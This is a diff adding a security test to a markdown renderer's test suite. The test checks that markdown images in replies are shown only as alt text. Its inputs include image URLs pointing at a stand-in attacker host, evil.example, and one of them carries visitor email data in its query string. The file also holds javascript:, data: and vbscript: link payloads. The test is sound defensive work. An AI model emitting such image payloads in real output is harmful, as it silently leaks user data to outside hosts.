@@ -41,6 +41,20 @@ describe("MarkdownRenderer safety", () => {
     expect(container.querySelector("[onerror]")).toBeNull();
   });
 
+  // Security review integrate/s2 (LOW): a markdown image in a reply makes the browser fetch any
+  // URL with no click, the classic exfiltration channel (the CSP is Report-Only).
+  it("never renders a markdown image from a reply, only its alt text", () => {
+    const { container } = renderMd(
+      "Look ![tracking pixel](https://evil.example/p.png?d=visitor%40mail.test) and " +
+        "![ref][r] and [![inner](https://evil.example/i.png)](/contact)\n\n[r]: https://evil.example/r.png",
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).not.toContain("evil.example");
+    expect(screen.getByText("tracking pixel")).toBeInTheDocument();
+    expect(screen.getByText("ref")).toBeInTheDocument();
+    expect(screen.getByText("inner")).toBeInTheDocument();
+  });
+
   it("renders javascript:, data:, vbscript: and mailto: links from a reply as plain text, not links", () => {
     const { container } = renderMd(
       "[alpha](javascript:alert(1)) [bravo](data:text/html,<b>x</b>) [charlie](vbscript:x) [delta](mailto:a@b.c)",
